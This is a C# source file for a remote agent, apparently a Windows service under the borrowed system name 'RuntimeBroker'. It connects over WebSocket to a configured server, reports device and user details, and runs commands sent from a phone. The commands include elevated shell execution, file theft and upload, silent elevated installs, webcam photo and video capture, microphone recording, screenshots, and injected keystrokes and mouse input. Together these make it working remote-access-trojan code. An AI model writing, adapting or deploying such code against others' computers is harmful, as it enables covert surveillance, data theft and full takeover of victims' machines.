using System.Net.WebSockets;
using System.Text;
using System.Text.Json;

namespace RuntimeBroker;

public class AgentClient
{
    private readonly AgentConfig _config;
    private DeviceInfo _device;
    private readonly CancellationTokenSource _cts = new();
    private readonly SemaphoreSlim _sendGate = new(1, 1);

    private ClientWebSocket? _ws;
    private int _reconnectDelaySec;
    private long _lastInboundMs;
    private bool _silenceForced;

    public event Action<string>? Log;

    public bool IsConnected => _ws?.State == WebSocketState.Open;
    public string MachineName => _device.Hostname;
    public static string AgentVersion => AgentVersionInfo.Version;

    public AgentClient(AgentConfig config)
    {
        _config = config;
        _device = new DeviceInfo();
        _reconnectDelaySec = _config.ReconnectDelaySec;
    }

    public void Stop() => _cts.Cancel();

    public async Task RunAsync()
    {
        // Inventory (wmic/PowerShell) can take 10-25s — collect it here on the
        // worker task, NEVER on the service OnStart path (SCM start timeout).
        try
        {
            var collected = await Task.Run(DeviceInfo.Collect, _cts.Token);
            _device = collected;
            LogLine($"Device: {_device.Hostname} | {_device.Model} | {_device.Username}");
        }
        catch (OperationCanceledException)
        {
            return;
        }
        catch (Exception ex)
        {
            LogLine($"Device inventory failed ({ex.Message}) — continuing with defaults.");
        }

        while (!_cts.IsCancellationRequested)
        {
            try
            {
                var uri = new Uri($"{_config.ServerUrl.TrimEnd('/')}?token={Uri.EscapeDataString(_config.Token)}");

                _ws?.Dispose();
                _ws = new ClientWebSocket();
                _ws.Options.KeepAliveInterval = TimeSpan.FromSeconds(15);
                await _ws.ConnectAsync(uri, _cts.Token);
                _reconnectDelaySec = _config.ReconnectDelaySec;
                Interlocked.Exchange(ref _lastInboundMs, Environment.TickCount64);
                _silenceForced = false;
                LogLine($"Connected to {uri.Host}:{uri.Port}");

                await SendAsync(new
                {
                    type = "register",
                    machineName = _device.Hostname,
                    hostname = _device.Hostname,
                    model = _device.Model,
                    serial = _device.Serial,
                    username = _device.Username,
                    user = _device.Username,
                    os = _device.Os,
                    ip = _device.Ip,
                    version = AgentVersion
                });

                var keepAliveSec = Math.Max(0, _config.KeepAliveSec);
                using var keepAliveCts = CancellationTokenSource.CreateLinkedTokenSource(_cts.Token);
                var keepAliveTask = keepAliveSec > 0 ? KeepAliveLoopAsync(keepAliveSec, keepAliveCts.Token) : Task.CompletedTask;

                try
                {
                    await ReceiveLoopAsync();
                }
                finally
                {
                    keepAliveCts.Cancel();
                    try { await keepAliveTask; } catch { }
                }
            }
            catch (OperationCanceledException)
            {
                return;
            }
            catch (Exception ex)
            {
                LogLine(_silenceForced ? $"Connection was silent — reconnecting." : $"Connection error: {ex.Message}");
            }

            _reconnectDelaySec = Math.Min(30, Math.Max(1, _reconnectDelaySec) + 3);
            LogLine($"Reconnecting in {_reconnectDelaySec}s...");
            try { await Task.Delay(_reconnectDelaySec * 1000, _cts.Token); } catch { return; }
        }
    }

    private async Task KeepAliveLoopAsync(int intervalSec, CancellationToken ct)
    {
        // Silence watchdog: the server echoes every keepalive. If we hear
        // nothing back for 3 intervals the connection is a zombie (proxy kept
        // the TCP half-open while the backend was recycled) — force a drop so
        // the outer loop reconnects and re-registers instead of staying
        // "connected" forever while the server shows us offline.
        var silenceLimitMs = Math.Max(45, intervalSec * 3) * 1000L;
        while (!ct.IsCancellationRequested)
        {
            try { await Task.Delay(intervalSec * 1000, ct); } catch { return; }
            try
            {
                await SendAsync(new { type = "keepalive", at = DateTimeOffset.UtcNow.ToUnixTimeSeconds() });
            }
            catch (Exception ex)
            {
                LogLine($"Keepalive send failed: {ex.Message}");
                try { _ws?.Dispose(); } catch { }
                return;
            }
            var silent = Environment.TickCount64 - Volatile.Read(ref _lastInboundMs);
            if (silent > silenceLimitMs)
            {
                _silenceForced = true;
                LogLine($"No server response for {silent / 1000}s — forcing reconnect.");
                try { _ws?.Dispose(); } catch { }
                return;
            }
        }
    }

    private void NoteInbound() => Interlocked.Exchange(ref _lastInboundMs, Environment.TickCount64);

    private async Task ReceiveLoopAsync()
    {
        var buffer = new byte[16384];
        while (_ws?.State == WebSocketState.Open)
        {
            try
            {
                WebSocketReceiveResult result;
                using var ms = new MemoryStream();
                do
                {
                    result = await _ws.ReceiveAsync(new ArraySegment<byte>(buffer), _cts.Token);
                    ms.Write(buffer, 0, result.Count);
                } while (!result.EndOfMessage);

                NoteInbound();

                if (result.MessageType == WebSocketMessageType.Close)
                {
                    try { await _ws.CloseAsync(WebSocketCloseStatus.NormalClosure, "bye", CancellationToken.None); } catch { }
                    break;
                }

                var text = Encoding.UTF8.GetString(ms.ToArray());
                _ = Task.Run(() => HandleMessageAsync(text));
            }
            catch (OperationCanceledException)
            {
                return;
            }
            catch (Exception ex)
            {
                LogLine($"Receive error: {ex.Message}");
                return;
            }
        }
    }

    private async Task HandleMessageAsync(string json)
    {
        try
        {
            using var doc = JsonDocument.Parse(json);
            var root = doc.RootElement;
            var type = root.TryGetProperty("type", out var t) ? t.GetString() : "";
            switch (type)
            {
                case "hello":
                    LogLine("Channel ready.");
                    break;
                case "registered":
                    LogLine($"Registered on server as {_device.Hostname}");
                    break;
                case "cmd":
                    await HandleCmdAsync(root);
                    break;
            }
        }
        catch (Exception ex)
        {
            LogLine($"Message error: {ex.Message}");
        }
    }

    private async Task HandleCmdAsync(JsonElement el)
    {
        var taskId = RemoteCommands.GetString(el, "taskId");
        var cmd = RemoteCommands.GetString(el, "cmd");
        var p = el.TryGetProperty("params", out var pp) && pp.ValueKind == JsonValueKind.Object
            ? pp : new JsonElement?();
        JsonElement empty = JsonDocument.Parse("{}").RootElement;
        var prm = p ?? empty;

        try
        {
            switch (cmd)
            {
                case "capture_screenshot":
                    await HandleScreenshotAsync(taskId, prm);
                    return;
                case "shell_exec": {
                    var command = RemoteCommands.GetString(prm, "command");
                    var timeout = RemoteCommands.GetInt(prm, "timeoutSec", 30);
                    var admin = RemoteCommands.GetBool(prm, "admin", false);
                    var (ok, output, code, err) = RemoteCommands.ShellExec(command, timeout, admin);
                    await Result(taskId, ok, output, null, err ?? "", code);
                    return;
                }
                case "list_processes": {
                    var list = RemoteCommands.ListProcesses();
                    await Result(taskId, true, "", list, "", 0);
                    return;
                }
                case "kill_process": {
                    var pid = RemoteCommands.GetInt(prm, "pid", -1);
                    var (ok, err) = RemoteCommands.KillProcess(pid);
                    await Result(taskId, ok, ok ? $"Killed {pid}" : "", null, err ?? "", ok ? 0 : 1);
                    return;
                }
                case "list_services": {
                    var list = RemoteCommands.ListServices();
                    await Result(taskId, true, "", list, "", 0);
                    return;
                }
                case "service_action": {
                    var name = RemoteCommands.GetString(prm, "name");
                    var action = RemoteCommands.GetString(prm, "action");
                    var (ok, err) = RemoteCommands.ServiceAction(name, action);
                    await Result(taskId, ok, ok ? $"{action} {name}" : "", null, err ?? "", ok ? 0 : 1);
                    return;
                }
                case "list_files": {
                    var path = RemoteCommands.GetString(prm, "path");
                    var rec = RemoteCommands.GetBool(prm, "recursive", false);
                    try
                    {
                        var items = RemoteCommands.ListFiles(path, rec);
                        await Result(taskId, true, string.IsNullOrWhiteSpace(path) ? "C:\\" : path, items, "", 0);
                    }
                    catch (Exception ex)
                    {
                        await Result(taskId, false, "", null, ex.Message, 1);
                    }
                    return;
                }
                case "read_file": {
                    var path = RemoteCommands.GetString(prm, "path");
                    var (ok, b64, err) = RemoteCommands.ReadFile(path);
                    var fn = Path.GetFileName(path);
                    var ext = Path.GetExtension(path);
                    await ResultSafe(taskId, ok, b64 ?? "", null, err ?? "", ok ? 0 : 1, filename: fn, mime: MimeForExt(ext));
                    return;
                }
                case "write_file": {
                    var path = RemoteCommands.GetString(prm, "path");
                    var b64 = RemoteCommands.GetString(prm, "base64");
                    var (ok, err) = RemoteCommands.WriteFile(path, b64);
                    await Result(taskId, ok, ok ? $"Wrote {path}" : "", null, err ?? "", ok ? 0 : 1);
                    return;
                }
                case "transfer_file": {
                    var b64 = RemoteCommands.GetString(prm, "base64");
                    var name = RemoteCommands.GetString(prm, "filename");
                    var (ok, saved, err) = RemoteCommands.TransferFile(b64, name);
                    await Result(taskId, ok, saved ?? "", null, err ?? "", ok ? 0 : 1);
                    return;
                }
                // Input runs in the user session (SendInput from the
                // Session-0 service never reaches the interactive desktop).
                case "input_text": {
                    var text = RemoteCommands.GetString(prm, "text");
                    var file = StageText(text);
                    var (ok, err) = PowerShellRunner.RunInteractiveInput($"--input-text \"{file}\"", 30);
                    if (!ok) { try { File.Delete(file); } catch { } }
                    await Result(taskId, ok, ok ? "ok" : err ?? "", null, ok ? "" : err ?? "", ok ? 0 : 1);
                    return;
                }
                case "input_mouse": {
                    var x = RemoteCommands.GetInt(prm, "x");
                    var y = RemoteCommands.GetInt(prm, "y");
                    var action = (RemoteCommands.GetString(prm, "action") ?? "").Trim();
                    if (string.IsNullOrEmpty(action)) action = "move";
                    var amount = RemoteCommands.GetInt(prm, "amount",
                        RemoteCommands.GetInt(prm, "delta",
                        RemoteCommands.GetInt(prm, "dy", 120)));
                    var (ok, err) = PowerShellRunner.RunInteractiveInput(
                        $"--input-mouse {x} {y} {action} {amount}", 30);
                    await Result(taskId, ok, ok ? "ok" : err ?? "", null, ok ? "" : err ?? "", ok ? 0 : 1);
                    return;
                }
                case "input_paragraph": {
                    var text = RemoteCommands.GetString(prm, "text");
                    var wpm = RemoteCommands.GetInt(prm, "wpm", 60);
                    var addEnter = RemoteCommands.GetBool(prm, "addEnter", false);
                    // Fire-and-forget in the user session: the phone watches
                    // progress on live screen. Stopped via stop_typing/stop_all.
                    var file = StageText(text);
                    var (ok, err) = PowerShellRunner.StartInteractiveParagraph(file, wpm, addEnter);
                    if (!ok) { try { File.Delete(file); } catch { } }
                    await Result(taskId, ok, ok ? "Started" : err ?? "", null, ok ? "" : err ?? "", ok ? 0 : 1);
                    return;
                }
                case "stop_typing":
                    InteractiveActions.CancelAll();
                    PowerShellRunner.EndInteractiveInput();
                    await Result(taskId, true, "Typing stopped", null, "", 0);
                    return;
                case "stop_all":
                    InteractiveActions.CancelAll();
                    PowerShellRunner.EndInteractiveInput();
                    RemoteCommands.StopAudio();
                    LogLine("Stop-all received.");
                    return;
                case "screen_rotate": {
                    var deg = RemoteCommands.GetInt(prm, "degrees", 0);
                    var (ok, err) = RemoteCommands.ScreenRotate(deg);
                    await Result(taskId, ok, ok ? $"Rotated {deg}" : "", null, err ?? "", ok ? 0 : 1);
                    return;
                }
                case "camera_photo": {
                    var (ok, b64, err) = RemoteCommands.CameraPhoto();
                    await ResultSafe(taskId, ok, b64 ?? "", null, err ?? "", ok ? 0 : 1, filename: "camera.jpg", mime: "image/jpeg");
                    return;
                }
                case "camera_video": {
                    var seconds = RemoteCommands.GetInt(prm, "seconds", 10);
                    var (ok, b64, err) = RemoteCommands.CameraVideo(seconds);
                    await ResultSafe(taskId, ok, b64 ?? "", null, err ?? "", ok ? 0 : 1, filename: "camera.avi", mime: "video/x-msvideo");
                    return;
                }
                case "mic_record": {
                    var seconds = RemoteCommands.GetInt(prm, "seconds", 5);
                    var (ok, b64, err) = RemoteCommands.MicRecord(seconds);
                    await ResultSafe(taskId, ok, b64 ?? "", null, err ?? "", ok ? 0 : 1, filename: "mic.wav", mime: "audio/wav");
                    return;
                }
                case "play_audio": {
                    var b64 = RemoteCommands.GetString(prm, "base64");
                    var name = RemoteCommands.GetString(prm, "filename");
                    var (ok, err) = RemoteCommands.PlayAudio(b64, name);
                    await Result(taskId, ok, ok ? "Playing" : "", null, err ?? "", ok ? 0 : 1);
                    return;
                }
                case "stop_audio":
                    RemoteCommands.StopAudio();
                    await Result(taskId, true, "Audio stopped", null, "", 0);
                    return;
                case "power_action": {
                    var action = (RemoteCommands.GetString(prm, "action") ?? "").Trim().ToLowerInvariant();
                    // elevated (no UAC prompt when the agent itself is elevated);
                    // 3s grace so the result can reach the phone first
                    var cmdText = action switch
                    {
                        "shutdown" or "poweroff" => "shutdown /s /t 3 /c \"Mimo remote command\"",
                        "restart" or "reboot" => "shutdown /r /t 3",
                        "sleep" => "rundll32 powrprof.dll,SetSuspendState 0,1,0",
                        "hibernate" => "shutdown /h",
                        "lock" => "rundll32 user32.dll,LockWorkStation",
                        "logoff" => "shutdown /l",
                        _ => "",
                    };
                    if (cmdText == "")
                    {
                        await Result(taskId, false, "", null, $"Unknown power action '{action}'", 1);
                        return;
                    }
                    var (pok, pout, pcode, perr) = RemoteCommands.ShellExecElevated(cmdText, 20);
                    await Result(taskId, pok, pout, null, perr ?? "", pcode);
                    return;
                }
                case "install_app": {
                    var b64 = RemoteCommands.GetString(prm, "apk_base64") ?? RemoteCommands.GetString(prm, "exe") ?? "";
                    var name = RemoteCommands.GetString(prm, "filename") ?? "package.exe";
                    var args2 = RemoteCommands.GetString(prm, "args") ?? "";
                    if (string.IsNullOrEmpty(b64))
                    {
                        await Result(taskId, false, "", null, "Missing package data", 1);
                        return;
                    }
                    try
                    {
                        // stage into the shared work dir, then run silently as admin
                        var ext = Path.GetExtension(name);
                        if (string.IsNullOrEmpty(ext)) ext = ".exe";
                        var staged = Path.Combine(PowerShellRunner.CaptureWorkDir(),
                            $"install-{Guid.NewGuid():N}{ext}");
                        File.WriteAllBytes(staged, Convert.FromBase64String(b64));
                        var installCmd = (Path.GetExtension(staged).ToLowerInvariant() == ".msi")
                            ? $"msiexec /i \"{staged}\" /quiet /norestart {args2}"
                            : $"start /wait \"\" \"{staged}\" {args2}";
                        var (iok, iout, icode, ierr) = RemoteCommands.ShellExecElevated(installCmd, 300);
                        try { File.Delete(staged); } catch { }
                        await Result(taskId, iok, iok ? (iout.Length > 0 ? iout : "Install command finished") : iout, null,
                            iok ? "" : (ierr ?? $"Install failed (exit {icode})"), icode);
                    }
                    catch (FormatException)
                    {
                        await Result(taskId, false, "", null, "Package data is not valid base64", 1);
                    }
                    catch (Exception ex2)
                    {
                        await Result(taskId, false, "", null, ex2.Message, 1);
                    }
                    return;
                }
                default:
                    await Result(taskId, false, "", null, $"Unknown command: {cmd}", 1);
                    return;
            }
        }
        catch (Exception ex)
        {
            await Result(taskId, false, "", null, ex.Message, 1);
        }
    }

    private async Task HandleScreenshotAsync(string taskId, JsonElement prm)
    {
        try
        {
            var format = RemoteCommands.GetString(prm, "format");
            if (string.IsNullOrWhiteSpace(format)) format = "png";
            var quality = RemoteCommands.GetInt(prm, "quality", 80);
            var maxWidth = RemoteCommands.GetInt(prm, "maxWidth", 0);

            var png = ScreenCapture.CaptureBytes(format, quality, maxWidth);
            string error = "";
            if (png == null)
            {
                var outFile = Path.Combine(PowerShellRunner.CaptureWorkDir(), $"shot-{Guid.NewGuid().ToString("N")[..10]}.b64");
                var (b64, err) = PowerShellRunner.RunInInteractiveSession(outFile, 15, format, quality, maxWidth);
                error = err ?? "";
                if (b64 != null)
                {
                    try { png = Convert.FromBase64String(b64); } catch { png = null; error = "Invalid capture payload"; }
                }
            }

            if (png == null || png.Length == 0)
            {
                if (string.IsNullOrEmpty(error)) error = "Screenshot capture failed";
                await Result(taskId, false, "", null, error, 1);
                return;
            }
            // Real cursor position as fractions of the captured screen so
            // clients can draw the actual cursor (GDI capture excludes it).
            // A service can't read the cursor, so fall back to a one-shot read
            // in the user's interactive session.
            var cf = ScreenCapture.CursorFraction();
            float? cx = cf?.Cx, cy = cf?.Cy;
            if (cf == null) { var r = PowerShellRunner.RunInteractiveCursor(); cx = r.Cx; cy = r.Cy; }
            object? data = cx is not null && cy is not null ? new { cx, cy } : null;
            await ResultSafe(taskId, true, Convert.ToBase64String(png), data, "", 0, filename: "screenshot." + format, mime: "image/" + format);
        }
        catch (Exception ex)
        {
            await Result(taskId, false, "", null, ex.Message, 1);
        }
    }

    private static string StageText(string text)
    {
        var dir = PowerShellRunner.CaptureWorkDir();
        var file = Path.Combine(dir, $"input-{Guid.NewGuid():N}.txt");
        File.WriteAllText(file, text ?? "");
        return file;
    }

    private async Task Result(string taskId, bool success, string output, object? data, string error, int exitCode)
    {
        try
        {
            await SendAsync(new { type = "result", taskId, success, output, data, error, exitCode });
        }
        catch (Exception ex)
        {
            LogLine($"Result send failed: {ex.Message}");
        }
    }

    /// <summary>
    /// For results that exceed a safe WebSocket frame size (screenshots and
    /// camera videos can reach hundreds of MB): upload the payload over HTTP
    /// first and send only a small "ref" the phone can download with a GET.
    /// </summary>
    private async Task<(bool Sent, string Error)> ResultSafe(string taskId, bool success, string output, object? data, string error, int exitCode, string? filename = null, string? mime = null)
    {
        const int MaxInlineBytes = 8_000_000;
        var json = JsonSerializer.Serialize(new { type = "result", taskId, success, output, data, error, exitCode });
        if (Encoding.UTF8.GetByteCount(json) <= MaxInlineBytes)
        {
            try { await SendViaGate(json); return (true, ""); }
            catch (Exception ex) { LogLine($"Result send failed: {ex.Message}"); return (false, ex.Message); }
        }
        if (!success || string.IsNullOrEmpty(output))
        {
            // Huge failure text would still break the socket; truncate it hard.
            output = output is { Length: > 4000 } ? output[..4000] + " …(truncated)" : output;
            try { await SendViaGate(JsonSerializer.Serialize(new { type = "result", taskId, success, output, data = (object?)null, error, exitCode })); return (true, ""); }
            catch (Exception ex) { LogLine($"Result send failed: {ex.Message}"); return (false, ex.Message); }
        }
        try
        {
            // output is base64 here (capture/media results)
            var bytes = Convert.FromBase64String(output);
            var u = new Uri(_config.ServerUrl.Replace("wss://", "https://").Replace("ws://", "http://"));
            var httpBase = $"{u.Scheme}://{u.Authority}";
            var url = new Uri(httpBase + "/api/agent/upload");
            using var hc = new HttpClient();
            using var content = new ByteArrayContent(bytes);
            content.Headers.ContentType = new System.Net.Http.Headers.MediaTypeHeaderValue("application/octet-stream");
            var req = new HttpRequestMessage(HttpMethod.Post, url) { Content = content };
            req.Headers.TryAddWithoutValidation("X-Admin-Password", _config.Token);
            req.Headers.TryAddWithoutValidation("X-Filename", filename ?? "payload.bin");
            req.Headers.TryAddWithoutValidation("X-Mime", mime ?? "application/octet-stream");
            var res = await hc.SendAsync(req, _cts.Token);
            var body = await res.Content.ReadAsStringAsync(_cts.Token);
            string? rf = null;
            try
            {
                using var doc = JsonDocument.Parse(body);
                rf = doc.RootElement.TryGetProperty("ref", out var rp) ? rp.GetString() : null;
            }
            catch { }
            if (!res.IsSuccessStatusCode || string.IsNullOrEmpty(rf))
            {
                LogLine($"Upload of large result failed: HTTP {(int)res.StatusCode} {body[..Math.Min(200, body.Length)]}");
                // fall back to error result so the phone shows something sane
                await SendViaGate(JsonSerializer.Serialize(new { type = "result", taskId, success = false, output = "", data = (object?)null, error = "Result too large to send over WebSocket and upload failed", exitCode }));
                return (false, "upload-failed");
            }
            LogLine($"Large result uploaded: {bytes.Length} bytes, ref={rf}");
            var small = new Dictionary<string, object?>
            {
                ["type"] = "result",
                ["taskId"] = taskId,
                ["success"] = success,
                ["output"] = "",
                ["data"] = null,
                ["error"] = error,
                ["exitCode"] = exitCode,
                ["ref"] = rf,
                ["filename"] = filename ?? "camera.avi",
                ["mime"] = mime ?? "video/x-msvideo",
            };
            await SendViaGate(JsonSerializer.Serialize(small));
            return (true, "");
        }
        catch (Exception ex)
        {
            LogLine($"Large-result upload failed: {ex.Message}");
            return (false, ex.Message);
        }
    }

    private async Task SendViaGate(string json)
    {
        var socket = _ws;
        if (socket?.State != WebSocketState.Open)
            throw new WebSocketException("WebSocket is not open");
        var bytes = Encoding.UTF8.GetBytes(json);
        var seg = new ArraySegment<byte>(bytes);
        await _sendGate.WaitAsync(_cts.Token);
        try
        {
            if (socket.State != WebSocketState.Open)
                throw new WebSocketException("WebSocket closed before send");
            await socket.SendAsync(seg, WebSocketMessageType.Text, true, _cts.Token);
        }
        finally
        {
            _sendGate.Release();
        }
    }

    private async Task SendAsync(object payload)
    {
        var socket = _ws;
        if (socket?.State != WebSocketState.Open)
            throw new WebSocketException("WebSocket is not open");
        var json = JsonSerializer.Serialize(payload);
        var bytes = Encoding.UTF8.GetBytes(json);
        var seg = new ArraySegment<byte>(bytes);
        await _sendGate.WaitAsync(_cts.Token);
        try
        {
            if (socket.State != WebSocketState.Open)
                throw new WebSocketException("WebSocket closed before send");
            await socket.SendAsync(seg, WebSocketMessageType.Text, true, _cts.Token);
        }
        finally
        {
            _sendGate.Release();
        }
    }

    private void LogLine(string s) => Log?.Invoke(s);

    private static string MimeForExt(string ext) => ext.ToLowerInvariant() switch
    {
        ".png" => "image/png",
        ".jpg" or ".jpeg" => "image/jpeg",
        ".gif" => "image/gif",
        ".bmp" => "image/bmp",
        ".avi" => "video/x-msvideo",
        ".mp4" => "video/mp4",
        ".wav" => "audio/wav",
        ".webm" => "video/webm",
        _ => "application/octet-stream",
    };
}
